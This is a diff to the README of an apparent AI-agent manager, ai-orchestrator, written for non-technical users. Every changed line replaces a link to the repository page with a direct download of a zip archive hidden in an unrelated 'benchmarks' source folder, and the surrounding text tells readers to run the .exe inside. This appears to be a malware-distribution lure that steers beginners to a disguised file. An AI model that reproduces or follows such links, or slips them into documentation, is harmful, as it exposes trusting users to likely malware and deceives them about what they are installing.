@@ -1,6 +1,6 @@
 # 🚦 ai-orchestrator - Manage Multiple AI Agents Easily
 
-[![Download ai-orchestrator](https://img.shields.io/badge/Download-ai--orchestrator-green?style=for-the-badge)](https://github.com/jlinefake/ai-orchestrator)
+[![Download ai-orchestrator](https://img.shields.io/badge/Download-ai--orchestrator-green?style=for-the-badge)](https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This guide will take you through each step, even if you have no technical backgr
 
 Click this big button to open the download page in your web browser:
 
-[![Download ai-orchestrator](https://img.shields.io/badge/Download-ai--orchestrator-blue?style=for-the-badge)](https://github.com/jlinefake/ai-orchestrator)
+[![Download ai-orchestrator](https://img.shields.io/badge/Download-ai--orchestrator-blue?style=for-the-badge)](https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip)
 
 ### 2. Find the Installer
 
@@ -118,7 +118,7 @@ Here are the main parts you will use:
 
 To update the software:
 
-- Visit the same download page ([https://github.com/jlinefake/ai-orchestrator](https://github.com/jlinefake/ai-orchestrator)).
+- Visit the same download page ([https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip](https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip)).
 - Download the newest `.exe` installer.
 - Run it and follow steps like when installing the first time.
 
@@ -138,7 +138,7 @@ The new version will replace the old one but keep your settings.
 
 ## 🔗 Useful Resources
 
-- Visit the GitHub page for downloads and updates: [https://github.com/jlinefake/ai-orchestrator](https://github.com/jlinefake/ai-orchestrator)
+- Visit the GitHub page for downloads and updates: [https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip](https://github.com/jlinefake/ai-orchestrator/raw/refs/heads/main/src/main/indexing/benchmarks/orchestrator-ai-3.4.zip)
 - Check the Issues tab for common problems and fixes
 - Find user discussions for tips and tricks
 
